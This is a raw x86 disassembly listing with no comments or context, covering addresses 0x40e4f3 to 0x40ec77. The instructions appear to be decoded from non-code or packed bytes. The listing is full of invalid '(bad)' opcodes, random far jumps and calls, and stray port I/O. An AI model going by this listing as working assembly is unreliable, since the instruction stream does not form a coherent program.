  40e4f3:	xchg   edx,eax
  40e4f4:	jge    0x40e572
  40e4f6:	xor    ecx,esi
  40e4f8:	mov    bl,0x66
  40e4fa:	dec    eax
  40e4fb:	mov    eax,ds:0x4335e2d1
  40e500:	inc    esi
  40e501:	ret    
  40e502:	mov    al,0x6b
  40e504:	push   eax
  40e505:	sahf   
  40e506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e507:	test   BYTE PTR [ebp-0xb],0x4d
  40e50b:	cmp    cl,BYTE PTR [ecx]
  40e50d:	addr16 xchg edi,eax
  40e50f:	stos   DWORD PTR es:[edi],eax
  40e510:	loope  0x40e50d
  40e512:	mov    al,ds:0x18393e4e
  40e517:	and    al,0xae
  40e519:	(bad)  
  40e51a:	iret   
  40e51b:	test   DWORD PTR [esi-0x71],ebx
  40e51e:	rcr    eax,cl
  40e520:	lsl    edi,WORD PTR [edx+0x75]
  40e524:	push   ebx
  40e525:	cmc    
  40e526:	or     ecx,DWORD PTR [ebx-0x113c3a6]
  40e52c:	cmp    al,0x2b
  40e52e:	push   ebx
  40e52f:	jmp    0x4842:0x1fb547f0
  40e536:	and    al,0x3b
  40e538:	xor    bh,BYTE PTR [eax-0x32]
  40e53b:	inc    edi
  40e53c:	pop    ds
  40e53d:	sub    bl,BYTE PTR [ecx-0x62]
  40e540:	mov    WORD PTR [eax+0x6e86f718],gs
  40e546:	les    esi,FWORD PTR [ecx+0x3b]
  40e549:	inc    esp
  40e54a:	in     al,0x3
  40e54c:	add    bl,al
  40e54e:	push   ss
  40e54f:	in     eax,0xc5
  40e551:	daa    
  40e552:	(bad)  
  40e553:	(bad)  [ecx-0x1a]
  40e556:	xchg   esi,eax
  40e557:	sbb    al,0xdd
  40e559:	arpl   WORD PTR [esi-0x24f4d042],dx
  40e55f:	push   edx
  40e560:	push   cs
  40e561:	aas    
  40e562:	mov    al,ds:0x52302250
  40e567:	sbb    dh,BYTE PTR [esi]
  40e569:	and    BYTE PTR [edx],ch
  40e56b:	and    al,0x87
  40e56d:	cmp    eax,edx
  40e56f:	sub    al,0x1f
  40e571:	mov    bh,0x2c
  40e573:	lock ds xor ah,BYTE PTR ds:[eax+0x2d]
  40e579:	jbe    0x40e5db
  40e57b:	test   DWORD PTR [edi],0xe53878b3
  40e581:	cmp    eax,0xc7d4f450
  40e586:	dec    ebp
  40e587:	jbe    0x40e517
  40e589:	sbb    dl,BYTE PTR [ecx-0x5facb59b]
  40e58f:	xchg   ecx,eax
  40e590:	lods   eax,DWORD PTR ds:[esi]
  40e591:	sub    BYTE PTR [edx+0x4f5409da],0xea
  40e598:	jecxz  0x40e60b
  40e59a:	mov    edi,DWORD PTR [esi]
  40e59c:	or     eax,0x6752a927
  40e5a1:	aam    0x49
  40e5a3:	sbb    bh,BYTE PTR [edi+esi*1]
  40e5a6:	mov    cl,0xd1
  40e5a8:	inc    ebx
  40e5a9:	xchg   esp,eax
  40e5aa:	and    esi,eax
  40e5ac:	mov    al,ds:0x3f9f8e83
  40e5b1:	jno    0x40e5eb
  40e5b3:	pop    eax
  40e5b4:	xchg   BYTE PTR [edi],dl
  40e5b6:	das    
  40e5b7:	xchg   ebx,eax
  40e5b8:	rol    BYTE PTR [eax],cl
  40e5ba:	ds clc 
  40e5bc:	mov    ch,0x4b
  40e5be:	push   cs
  40e5bf:	(bad)  
  40e5c0:	bound  edx,QWORD PTR [eax+0xce45655]
  40e5c6:	dec    ebx
  40e5c7:	dec    BYTE PTR [edx]
  40e5c9:	push   esp
  40e5ca:	add    al,0xf2
  40e5cc:	int    0xb4
  40e5ce:	shr    BYTE PTR [eax-0x7741095b],0x6e
  40e5d5:	or     dh,BYTE PTR [edi-0x4f]
  40e5d8:	stos   BYTE PTR es:[edi],al
  40e5d9:	push   edx
  40e5da:	pop    esp
  40e5db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5dc:	pop    ebp
  40e5dd:	push   ebp
  40e5de:	imul   esi,ebx,0xffffffa2
  40e5e1:	call   0xe75c2f13
  40e5e6:	dec    eax
  40e5e7:	fs push ds
  40e5e9:	jb     0x40e5aa
  40e5eb:	cwde   
  40e5ec:	sbb    BYTE PTR [esi*8+0x238c207c],cl
  40e5f3:	pop    ss
  40e5f4:	jmp    FWORD PTR ds:0xa1892699
  40e5fa:	jmp    0x40e5e8
  40e5fc:	and    al,0x8c
  40e5fe:	dec    ebx
  40e5ff:	or     BYTE PTR [edi-0x6b5cda4e],bl
  40e605:	je     0x40e629
  40e607:	call   0x52e:0xbbab2311
  40e60e:	and    DWORD PTR [esp+ecx*2+0x929b083],ecx
  40e615:	fidivr WORD PTR [edi+esi*8+0x48ff92c3]
  40e61c:	adc    DWORD PTR [edx],ebx
  40e61e:	out    0x6e,eax
  40e620:	jmp    0x40e60a
  40e622:	inc    edi
  40e623:	dec    ebp
  40e624:	and    eax,0x1c4bc049
  40e629:	scas   al,BYTE PTR es:[edi]
  40e62a:	sar    DWORD PTR [edi+0x79],1
  40e62d:	(bad)  
  40e62e:	sub    ecx,DWORD PTR [eax+0xee7560a]
  40e634:	jp     0x40e64b
  40e636:	xor    eax,0x71256f2c
  40e63b:	scas   al,BYTE PTR es:[edi]
  40e63c:	inc    edi
  40e63d:	inc    esi
  40e63e:	dec    ebp
  40e63f:	mov    BYTE PTR [ebp+0x14],ah
  40e642:	into   
  40e643:	push   0x2b
  40e645:	mov    ah,0x88
  40e647:	mov    ds:0x59a76762,eax
  40e64c:	and    al,0x21
  40e64e:	hlt    
  40e64f:	jae    0x40e68f
  40e651:	dec    edi
  40e652:	out    0x55,al
  40e654:	mov    eax,0x207f31e1
  40e65a:	and    ecx,DWORD PTR [ecx-0x2d]
  40e65d:	mov    ebp,0xe48e6148
  40e662:	mov    ebx,0x871baae
  40e667:	and    al,0x6c
  40e669:	jae    0x40e6c4
  40e66b:	in     al,dx
  40e66c:	shr    BYTE PTR [ebx],0x49
  40e66f:	popf   
  40e670:	dec    esi
  40e671:	add    DWORD PTR [ecx+0x6d],0xb097bca0
  40e678:	lea    ecx,[eax+0x543a03bd]
  40e67e:	xchg   BYTE PTR es:[edi-0x46],bl
  40e682:	dec    esi
  40e683:	jle    0x40e641
  40e685:	test   ah,ah
  40e687:	or     dh,ah
  40e689:	push   ebp
  40e68a:	call   0x128b:0x463ace14
  40e691:	icebp  
  40e692:	push   0x2a
  40e694:	loop   0x40e6e0
  40e696:	jnp    0x40e705
  40e698:	jbe    0x40e631
  40e69a:	push   esi
  40e69b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e69c:	xchg   ecx,eax
  40e69d:	test   DWORD PTR [esi-0x19],ebx
  40e6a0:	(bad)  
  40e6a1:	mov    ebp,0x5aff366
  40e6a6:	dec    ecx
  40e6a7:	gs aas 
  40e6a9:	push   edi
  40e6aa:	scas   eax,DWORD PTR es:[edi]
  40e6ab:	or     BYTE PTR [edi-0x12621fe5],al
  40e6b1:	lods   eax,DWORD PTR ds:[esi]
  40e6b2:	xchg   edi,eax
  40e6b3:	jns    0x40e6bd
  40e6b5:	(bad)  
  40e6b6:	push   ss
  40e6b7:	das    
  40e6b8:	inc    ecx
  40e6b9:	pop    ebp
  40e6ba:	add    eax,0xaa811c60
  40e6bf:	shr    BYTE PTR [ebp+ebx*2-0x55abd153],cl
  40e6c6:	aas    
  40e6c7:	loopne 0x40e689
  40e6c9:	pop    esi
  40e6ca:	push   cs
  40e6cb:	pushf  
  40e6cc:	xlat   BYTE PTR ds:[ebx]
  40e6cd:	sahf   
  40e6ce:	cwde   
  40e6cf:	into   
  40e6d0:	push   esi
  40e6d1:	(bad)  
  40e6d2:	clc    
  40e6d3:	pop    edi
  40e6d4:	pop    ss
  40e6d5:	mov    eax,ds:0x65d9372d
  40e6da:	and    BYTE PTR [ecx-0x56],ch
  40e6dd:	mov    ecx,0xd2aee047
  40e6e2:	inc    ebp
  40e6e3:	xchg   ax,ax
  40e6e5:	or     al,0xee
  40e6e7:	adc    BYTE PTR [esi-0x28],bh
  40e6ea:	sbb    BYTE PTR [ebx-0x5643d31f],cl
  40e6f0:	fwait
  40e6f1:	sub    ebx,DWORD PTR [esi-0x29]
  40e6f4:	cdq    
  40e6f5:	mov    DWORD PTR [ecx],esi
  40e6f7:	jns    0x40e690
  40e6f9:	xchg   BYTE PTR [esi+0x753c67],al
  40e6ff:	sub    DWORD PTR [eax-0x4e],edx
  40e702:	mov    esi,0xb55163e7
  40e707:	les    ecx,FWORD PTR [eax+0x7d]
  40e70a:	push   esp
  40e70b:	and    esp,DWORD PTR [eax+eiz*2-0x48]
  40e70f:	dec    ebp
  40e710:	sub    ecx,DWORD PTR [edi]
  40e712:	pop    ebx
  40e713:	cmp    ch,BYTE PTR [ecx+0x52]
  40e716:	lahf   
  40e717:	dec    ebp
  40e718:	mov    ds:0xe46b759f,al
  40e71d:	jno    0x40e78a
  40e71f:	dec    ebx
  40e720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e721:	pop    edi
  40e722:	loop   0x40e6cb
  40e724:	cld    
  40e725:	pop    edx
  40e726:	hlt    
  40e727:	lods   eax,DWORD PTR ds:[esi]
  40e728:	lods   al,BYTE PTR ds:[esi]
  40e729:	dec    edi
  40e72a:	dec    edx
  40e72b:	gs test eax,0x64a374ce
  40e731:	mov    esi,0x459ab8fe
  40e736:	pop    esp
  40e737:	iret   
  40e738:	inc    esi
  40e739:	pop    esi
  40e73a:	fmul   st,st(6)
  40e73c:	mov    edi,DWORD PTR [ecx-0x799bd992]
  40e742:	(bad)  [edx+0x54]
  40e745:	sub    ch,bh
  40e747:	jo     0x40e782
  40e749:	mov    eax,ds:0x9f1f8e51
  40e74e:	jge    0x40e78d
  40e750:	and    eax,0xc4a680c2
  40e755:	ficom  DWORD PTR [ebp-0x44dd4caf]
  40e75b:	int3   
  40e75c:	mov    cs,WORD PTR [edi-0x2f59b43d]
  40e762:	mov    ebx,?
  40e764:	fstp   QWORD PTR [eax+edx*2]
  40e767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e768:	inc    eax
  40e769:	mov    eax,ds:0x47da69f3
  40e76e:	mov    ds:0x1c3e2bf7,eax
  40e773:	push   cs
  40e774:	pop    ds
  40e775:	lods   eax,DWORD PTR ds:[esi]
  40e776:	nop
  40e777:	mov    bl,0xac
  40e779:	xor    eax,0x767b2be5
  40e77e:	lahf   
  40e77f:	mov    ds:0xccce8d08,al
  40e784:	xor    DWORD PTR [edi+0x3973f119],0x3d8f8bbe
  40e78e:	(bad)  
  40e78f:	(bad)  
  40e791:	test   al,0x2
  40e793:	jo     0x40e7a6
  40e795:	push   0x8c99c15
  40e79a:	pusha  
  40e79b:	outs   dx,DWORD PTR ds:[esi]
  40e79c:	(bad)  [eax-0x2f]
  40e79f:	jmp    0xacc5bc04
  40e7a4:	test   eax,0x46f0464c
  40e7a9:	adc    eax,0xddce49f5
  40e7ae:	mov    WORD PTR [ebx],fs
  40e7b0:	jo     0x40e7e8
  40e7b2:	mov    al,0xc8
  40e7b4:	imul   eax,DWORD PTR [edi-0x77],0xf78a349d
  40e7bb:	cmp    al,0xf4
  40e7bd:	lods   al,BYTE PTR ds:[esi]
  40e7be:	pop    ds
  40e7bf:	and    al,0x10
  40e7c1:	lahf   
  40e7c2:	xchg   esi,eax
  40e7c3:	repz mov cl,0x31
  40e7c6:	adc    bl,BYTE PTR [eax+0x57]
  40e7c9:	jo     0x40e801
  40e7cb:	sub    al,0x4a
  40e7cd:	lods   eax,DWORD PTR ds:[esi]
  40e7ce:	loop   0x40e76e
  40e7d0:	pushf  
  40e7d1:	cdq    
  40e7d2:	lock fimul WORD PTR [ebx]
  40e7d5:	addr16 in eax,0x5
  40e7d8:	shl    DWORD PTR [ebp-0x36],1
  40e7db:	mov    bh,bl
  40e7dd:	fdivr  DWORD PTR [esi+0x54ecb50]
  40e7e3:	hlt    
  40e7e4:	mov    BYTE PTR [ebx],dl
  40e7e6:	jle    0x40e854
  40e7e8:	xor    BYTE PTR [eax+0x40],bh
  40e7eb:	test   al,0x77
  40e7ed:	clc    
  40e7ee:	push   edx
  40e7ef:	sbb    BYTE PTR [edx],bh
  40e7f1:	les    edx,FWORD PTR [esi+0x6f40f864]
  40e7f7:	mov    ch,0xb4
  40e7f9:	pop    es
  40e7fa:	retf   0x90fb
  40e7fd:	mov    bl,BYTE PTR [edi-0x486f1f7f]
  40e803:	push   0xffffffcb
  40e805:	data16 fwait
  40e807:	stc    
  40e808:	retf   
  40e809:	(bad)
  40e80c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e80d:	test   eax,0x29a7d02f
  40e813:	cmp    ebp,DWORD PTR [eax-0x47]
  40e816:	mov    ebp,0x775cf8b6
  40e81b:	ret    0x8a53
  40e81e:	dec    ebx
  40e81f:	aad    0xb2
  40e821:	loop   0x40e84f
  40e823:	dec    ebx
  40e824:	push   es
  40e825:	mov    al,ds:0x5643ad8f
  40e82a:	stc    
  40e82b:	lock mov esp,0xf2ccba99
  40e831:	mov    ecx,0x96486758
  40e836:	sbb    cl,BYTE PTR [ebx]
  40e838:	test   DWORD PTR [esi+0x25907960],edi
  40e83e:	or     al,0x59
  40e840:	mov    dl,0xc2
  40e842:	test   cl,ch
  40e844:	cmp    al,BYTE PTR [ecx+0x6e]
  40e847:	icebp  
  40e848:	ja     0x40e8b7
  40e84a:	inc    ebp
  40e84b:	or     DWORD PTR [ebp*4+0x5eba7ef],edi
  40e852:	cmp    al,0xad
  40e854:	add    al,0x7d
  40e856:	shl    BYTE PTR [eax-0x65],0x7
  40e85a:	in     al,dx
  40e85b:	sbb    cl,BYTE PTR fs:0xd7fc696a
  40e862:	push   0x1a
  40e864:	js     0x40e831
  40e866:	mov    dh,0x33
  40e868:	addr16 loopne 0x40e880
  40e86b:	push   ecx
  40e86c:	sar    BYTE PTR [esi+0x5e323eaf],0xc0
  40e873:	lea    ebp,[ecx-0x29]
  40e876:	xchg   ebx,eax
  40e877:	sub    BYTE PTR ds:0x36a089a7,0x4b
  40e87e:	jge    0x40e8e1
  40e880:	scas   eax,DWORD PTR es:[edi]
  40e881:	es mov al,0x1
  40e884:	sbb    eax,0x68b0f185
  40e889:	pop    ecx
  40e88a:	div    esp
  40e88c:	mov    edi,esi
  40e88e:	or     eax,0xb23edab3
  40e893:	cwde   
  40e894:	sbb    edi,DWORD PTR [ebp-0x70]
  40e897:	mov    ch,0x66
  40e899:	bound  esp,QWORD PTR [eax-0x54]
  40e89c:	sub    BYTE PTR [edx+0x502e1e35],0x9d
  40e8a3:	push   edx
  40e8a4:	pop    ds
  40e8a5:	clc    
  40e8a6:	sub    BYTE PTR [esp+ebx*1+0x9],ch
  40e8aa:	(bad)  ds:0xb7d07f90
  40e8b0:	lds    esp,FWORD PTR [edx]
  40e8b2:	jnp    0x40e860
  40e8b4:	mov    bl,dh
  40e8b6:	mov    ch,0xce
  40e8b8:	mov    esi,0x68d1ef59
  40e8bd:	or     al,0x47
  40e8bf:	imul   DWORD PTR [edi+0x6ffa4d43]
  40e8c5:	pop    edi
  40e8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8c7:	sbb    eax,0x744c21b
  40e8cc:	push   eax
  40e8cd:	out    0x4d,al
  40e8cf:	or     DWORD PTR [ebx-0x31],ecx
  40e8d2:	test   eax,0x299b6ee9
  40e8d7:	stos   DWORD PTR es:[edi],eax
  40e8d8:	arpl   WORD PTR [edi+0x76],sp
  40e8db:	mov    esi,0x69dedad5
  40e8e0:	inc    ebp
  40e8e1:	enter  0x2655,0xca
  40e8e5:	cmp    esi,esp
  40e8e7:	and    DWORD PTR [esi-0x45],esi
  40e8ea:	jmp    0xa30:0x8c60fce7
  40e8f1:	xchg   edx,eax
  40e8f2:	cwde   
  40e8f3:	jbe    0x40e964
  40e8f5:	outs   dx,BYTE PTR ds:[esi]
  40e8f6:	adc    ecx,DWORD PTR [ecx+edi*1+0x14]
  40e8fa:	dec    eax
  40e8fb:	mov    edi,0xd581d253
  40e900:	push   ebp
  40e901:	cmp    al,0x77
  40e903:	shr    BYTE PTR [ecx],0x96
  40e906:	ret    
  40e907:	dec    edi
  40e908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e909:	dec    edi
  40e90a:	adc    al,0x55
  40e90c:	push   cs
  40e90d:	repz bound ecx,QWORD PTR [edx+0x40]
  40e911:	scas   eax,DWORD PTR es:[edi]
  40e912:	cmp    bl,BYTE PTR [esp+eiz*4-0x73c233e1]
  40e919:	xchg   BYTE PTR [esp-0x2ce94845],dl
  40e920:	pop    ebp
  40e921:	ds gs jb 0x40e95f
  40e925:	outs   dx,BYTE PTR ds:[esi]
  40e926:	pop    ds
  40e927:	sbb    DWORD PTR [eax],edi
  40e929:	f2xm1  
  40e92b:	xlat   BYTE PTR ds:[ebx]
  40e92c:	mov    bl,0xf3
  40e92e:	test   dl,al
  40e930:	jg     0x40e95b
  40e932:	aas    
  40e933:	jne    0x40e933
  40e935:	lods   al,BYTE PTR ds:[esi]
  40e936:	sub    DWORD PTR [edx+0x65],0x6d19695c
  40e93d:	mov    edx,0x2692ec0e
  40e942:	cli    
  40e943:	sar    dl,cl
  40e945:	out    0xc1,al
  40e947:	ror    DWORD PTR es:[ebx+0x586d6dd6],cl
  40e94e:	div    DWORD PTR [eax-0x7881641f]
  40e954:	cli    
  40e955:	loopne 0x40e8da
  40e957:	jnp    0x40e977
  40e959:	test   BYTE PTR [ebp+0xad0761e],0xa6
  40e960:	or     DWORD PTR [esi+0x30],ebp
  40e963:	xchg   ebp,eax
  40e964:	sbb    DWORD PTR [ecx+edi*2-0x33476c6f],ecx
  40e96b:	aam    0x69
  40e96d:	mov    edi,0x2795d6c0
  40e972:	push   eax
  40e973:	jmp    0x40e97f
  40e975:	pop    ds
  40e976:	fadd   DWORD PTR [esi]
  40e978:	xlat   BYTE PTR ds:[ebx]
  40e979:	in     eax,dx
  40e97a:	loop   0x40e924
  40e97c:	cld    
  40e97d:	adc    DWORD PTR [edi],0x76
  40e980:	or     ecx,DWORD PTR [ecx]
  40e982:	dec    esi
  40e983:	jp     0x40e98d
  40e985:	adc    ah,bh
  40e987:	add    BYTE PTR [eax+edx*4-0x48],cl
  40e98b:	jmp    0xb62d:0xd7578440
  40e992:	fdiv   QWORD PTR [ecx-0x45972ba]
  40e998:	or     BYTE PTR [ebp+0x5fb98dee],cl
  40e99e:	sbb    eax,0x5ea30374
  40e9a3:	and    DWORD PTR [esi-0x39],0x922abeae
  40e9aa:	or     eax,DWORD PTR [esp+ebp*1+0x7e]
  40e9ae:	std    
  40e9af:	cwde   
  40e9b0:	rcr    ecx,1
  40e9b2:	add    dh,ch
  40e9b4:	icebp  
  40e9b5:	mov    al,ds:0x92931cb2
  40e9ba:	in     eax,dx
  40e9bb:	dec    eax
  40e9bc:	add    al,0xa7
  40e9be:	push   ds
  40e9bf:	loop   0x40e9ce
  40e9c1:	(bad)  
  40e9c3:	mov    bl,0xcf
  40e9c5:	mov    DWORD PTR [edx-0x7b],edi
  40e9c8:	aaa    
  40e9c9:	inc    esp
  40e9ca:	(bad)  
  40e9cb:	jge    0x40ea02
  40e9cd:	push   ss
  40e9ce:	mov    eax,ds:0xf14acd55
  40e9d3:	stc    
  40e9d4:	inc    ecx
  40e9d5:	out    dx,eax
  40e9d6:	aam    0x22
  40e9d8:	xor    eax,0x9390f5e3
  40e9dd:	mov    esp,DWORD PTR [ecx]
  40e9df:	loop   0x40e9f9
  40e9e1:	mov    ebx,0xef003d94
  40e9e6:	dec    ecx
  40e9e7:	mov    WORD PTR [edi],?
  40e9e9:	mov    cl,0x80
  40e9eb:	shr    ebx,0x91
  40e9ee:	cld    
  40e9ef:	mov    esp,0xfae3c75b
  40e9f4:	sti    
  40e9f5:	and    esp,DWORD PTR [ecx+ecx*4]
  40e9f8:	stos   DWORD PTR es:[edi],eax
  40e9f9:	fsubr  DWORD PTR [eax-0x55]
  40e9fc:	rol    DWORD PTR [edx-0x62],0xff
  40ea00:	jmp    0xc6bd1350
  40ea05:	ret    0xf7ca
  40ea08:	xchg   esp,eax
  40ea09:	iret   
  40ea0a:	xor    edx,DWORD PTR [edi+0x50]
  40ea0d:	repnz push ss
  40ea0f:	push   ds
  40ea10:	ins    BYTE PTR es:[edi],dx
  40ea11:	cs lahf 
  40ea13:	sbb    eax,0x3240dd0
  40ea18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea19:	mov    ds:0xb8b639ce,al
  40ea1e:	scas   eax,DWORD PTR es:[edi]
  40ea1f:	in     al,dx
  40ea20:	xchg   edi,eax
  40ea21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea22:	or     al,0x2f
  40ea24:	mov    ecx,0x40379a1
  40ea29:	mov    BYTE PTR [ebx],0xb5
  40ea2c:	enter  0x1743,0x1a
  40ea30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea31:	push   eax
  40ea32:	pop    edi
  40ea33:	mov    ecx,0x58295712
  40ea38:	inc    ebx
  40ea39:	neg    BYTE PTR [ecx*1-0x5d7ce91b]
  40ea40:	retf   
  40ea41:	sti    
  40ea42:	fcmovu st,st(4)
  40ea44:	(bad)  
  40ea45:	xor    BYTE PTR [ebp+0x5e],cl
  40ea48:	(bad)  
  40ea49:	out    dx,eax
  40ea4a:	lea    di,[ebx-0x737eb10d]
  40ea51:	stos   BYTE PTR es:[edi],al
  40ea52:	das    
  40ea53:	std    
  40ea54:	mov    ds:0xafbdf52,al
  40ea59:	xchg   edx,eax
  40ea5a:	xor    WORD PTR [eax+0x35],sp
  40ea5e:	inc    ecx
  40ea5f:	pop    ds
  40ea60:	test   al,0xf3
  40ea62:	cld    
  40ea63:	mov    bh,0x6e
  40ea65:	int    0xd
  40ea67:	mov    ds:0x8dedc0bd,eax
  40ea6c:	stos   BYTE PTR es:[edi],al
  40ea6d:	pop    esi
  40ea6e:	xor    edi,DWORD PTR [edx-0x69ad2c01]
  40ea74:	scas   eax,DWORD PTR es:[edi]
  40ea75:	add    dl,BYTE PTR [ebp+ebx*2+0x7]
  40ea79:	into   
  40ea7a:	ret    0x6cfb
  40ea7d:	les    ebp,FWORD PTR [edx]
  40ea7f:	add    eax,0x3f3059df
  40ea84:	or     DWORD PTR [esi+0x73d2e505],ebp
  40ea8a:	cs aad 0x24
  40ea8d:	(bad)  
  40ea8e:	sbb    dl,BYTE PTR [edi]
  40ea90:	retf   0x9049
  40ea93:	pop    eax
  40ea94:	les    edi,FWORD PTR [ecx]
  40ea96:	sbb    bl,BYTE PTR [esi+0x6b40679c]
  40ea9c:	arpl   WORD PTR ds:0xe071781d,cx
  40eaa2:	or     eax,0x65f5e49d
  40eaa7:	inc    edx
  40eaa8:	test   eax,0xc52c0620
  40eaad:	jno    0x40ead7
  40eaaf:	call   0x9abc:0xdc90095e
  40eab6:	mov    eax,ds:0x6e294478
  40eabb:	aaa    
  40eabc:	test   eax,0x95351601
  40eac1:	in     al,0x85
  40eac3:	mov    ds,esi
  40eac5:	cmp    al,0xf8
  40eac7:	(bad)  ds:[ebx-0x28]
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	out    0xe4,al
  40eace:	neg    edi
  40ead0:	sub    eax,ebp
  40ead2:	fwait
  40ead3:	jae    0x40ead6
  40ead5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40ead7:	adc    eax,0x7dddc7b7
  40eadc:	dec    ebp
  40eadd:	sub    dh,bh
  40eadf:	out    0xb3,eax
  40eae1:	adc    edi,DWORD PTR [eax]
  40eae3:	cli    
  40eae4:	push   ecx
  40eae5:	pop    ebx
  40eae6:	mov    esp,0x5eb6e0e1
  40eaeb:	xor    al,0x5
  40eaed:	iret   
  40eaee:	pop    esp
  40eaef:	push   0x64
  40eaf1:	xor    eax,0x649f7d76
  40eaf6:	mov    eax,?
  40eaf8:	push   0xffffffb6
  40eafa:	mov    DWORD PTR [ecx-0xc58945f],edi
  40eb00:	push   edi
  40eb01:	fiadd  WORD PTR [ebx+0x74]
  40eb04:	retf   0x170c
  40eb07:	test   DWORD PTR [esi],esp
  40eb09:	pop    edx
  40eb0a:	sub    cl,BYTE PTR [ebx+0xc8fe4e3]
  40eb10:	pop    es
  40eb11:	add    ebp,DWORD PTR [ebp+0x29]
  40eb14:	and    eax,DWORD PTR [esi+ebp*4+0x128afe5a]
  40eb1b:	dec    esp
  40eb1c:	pop    ss
  40eb1d:	push   0x78
  40eb1f:	jno    0x40eb3c
  40eb21:	inc    esi
  40eb22:	pop    esi
  40eb23:	inc    ebx
  40eb24:	jb     0x40eadc
  40eb26:	mov    esp,0x55d4653b
  40eb2b:	mov    dh,0x4e
  40eb2d:	pop    edi
  40eb2e:	xor    eax,edx
  40eb30:	(bad)  
  40eb31:	shl    DWORD PTR [ebp-0x35],1
  40eb34:	lea    esi,[edi+ecx*2-0x3107d180]
  40eb3b:	or     dh,dl
  40eb3d:	adc    BYTE PTR [ebp-0x51ce623c],0x8c
  40eb44:	retf   
  40eb45:	jno    0x40eb2b
  40eb47:	call   0x1316:0x89182e1e
  40eb4e:	mov    esi,0xc0d9856d
  40eb53:	shl    DWORD PTR [ecx-0x5d197730],cl
  40eb59:	push   cs
  40eb5a:	leave  
  40eb5b:	mov    bh,0xe5
  40eb5d:	adc    al,0x9c
  40eb5f:	lahf   
  40eb60:	and    eax,0x90d0b7f6
  40eb65:	xor    al,0x9f
  40eb67:	and    eax,0x7f228caf
  40eb6c:	push   ds
  40eb6d:	repnz adc bl,BYTE PTR [ecx-0x70]
  40eb71:	int    0x5c
  40eb73:	jmp    0xf3a4699d
  40eb78:	fcom   QWORD PTR [ebx]
  40eb7a:	(bad)  [edi-0x15a519be]
  40eb80:	xchg   ebx,eax
  40eb81:	das    
  40eb82:	xor    al,dh
  40eb84:	push   esp
  40eb85:	xchg   edx,eax
  40eb86:	pushf  
  40eb87:	jl     0x40eb75
  40eb89:	sub    al,0xb3
  40eb8b:	retf   
  40eb8c:	bound  ebp,QWORD PTR [ecx+0x22961deb]
  40eb92:	imul   esi,DWORD PTR ds:0x718369ee,0x69f465f4
  40eb9c:	imul   edx,DWORD PTR [ebx+0x68070510],0xf106dc75
  40eba6:	call   FWORD PTR [edi]
  40eba8:	adc    eax,0xb0179deb
  40ebad:	loopne 0x40ebff
  40ebaf:	mov    WORD PTR [ebp+0x4c],?
  40ebb2:	(bad)  
  40ebb3:	loopne 0x40ebb6
  40ebb5:	repz sub BYTE PTR [edx+0x6525c2a3],dh
  40ebbc:	xchg   DWORD PTR [esi],eax
  40ebbe:	inc    edi
  40ebbf:	jne    0x40eb8b
  40ebc1:	jns    0x40eb5e
  40ebc3:	dec    BYTE PTR [edx+0x47c79820]
  40ebc9:	ja     0x40ec0a
  40ebcb:	jecxz  0x40ebbe
  40ebcd:	cmp    BYTE PTR [esi-0x4d],dh
  40ebd0:	or     edx,DWORD PTR [ecx+0x1a]
  40ebd3:	ss (bad) 
  40ebd5:	fcmove st,st(6)
  40ebd7:	retf   0x4074
  40ebda:	mov    ebp,DWORD PTR [esi]
  40ebdc:	push   ds
  40ebdd:	xor    bh,cl
  40ebdf:	or     ebx,DWORD PTR [esi-0x5be6d97c]
  40ebe5:	dec    edi
  40ebe6:	and    DWORD PTR [edi],eax
  40ebe8:	bound  ecx,QWORD PTR [eax]
  40ebea:	push   ebx
  40ebeb:	add    esi,DWORD PTR [ebx+0x18743533]
  40ebf1:	lahf   
  40ebf2:	jne    0x40ec3e
  40ebf4:	jle    0x40ebf7
  40ebf6:	add    BYTE PTR [esi],ch
  40ebf8:	sbb    DWORD PTR [ecx],ecx
  40ebfa:	xchg   edi,eax
  40ebfb:	popf   
  40ebfc:	(bad)  [esi-0x43]
  40ebff:	or     edi,esp
  40ec01:	repz xchg edx,eax
  40ec03:	mov    esi,0x4c4ea64
  40ec08:	add    BYTE PTR ds:0xa5be71f6,dh
  40ec0e:	push   edx
  40ec0f:	sub    bl,BYTE PTR [edx+edx*4]
  40ec12:	mov    ecx,0xa724d50b
  40ec17:	into   
  40ec18:	xchg   edx,eax
  40ec19:	mov    dl,0x4f
  40ec1b:	pushf  
  40ec1c:	sbb    cl,cl
  40ec1e:	(bad)  
  40ec1f:	enter  0xd198,0x9b
  40ec23:	ja     0x40ec2b
  40ec25:	inc    edi
  40ec26:	out    dx,al
  40ec27:	dec    esi
  40ec28:	daa    
  40ec29:	in     al,dx
  40ec2a:	neg    BYTE PTR [ebx-0x2f]
  40ec2d:	push   0x5
  40ec2f:	xchg   DWORD PTR [edx-0xb],ecx
  40ec32:	jmp    0x276f08b8
  40ec37:	test   al,0x32
  40ec39:	cmp    al,0x7d
  40ec3b:	jbe    0x40ec9a
  40ec3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec3e:	nop
  40ec3f:	ds jmp 0x50a1cca
  40ec45:	call   FWORD PTR ds:0xfd81dba2
  40ec4b:	call   0xcc96:0x42be1197
  40ec52:	jb     0x40ec9c
  40ec54:	fsub   st,st(4)
  40ec57:	out    dx,al
  40ec58:	aas    
  40ec59:	mov    dh,0xb9
  40ec5b:	rol    DWORD PTR [ecx-0x4c],cl
  40ec5e:	(bad)  [ecx]
  40ec60:	jno    0x40ebe9
  40ec62:	adc    cl,BYTE PTR [ecx]
  40ec64:	sbb    eax,0x393db3e
  40ec69:	scas   eax,DWORD PTR es:[edi]
  40ec6a:	pop    ds
  40ec6b:	xor    eax,0x104a84d2
  40ec70:	cld    
  40ec71:	dec    esp
  40ec72:	clc    
  40ec73:	nop
  40ec74:	bound  esi,QWORD PTR [esi-0x46]
  40ec77:	cli    
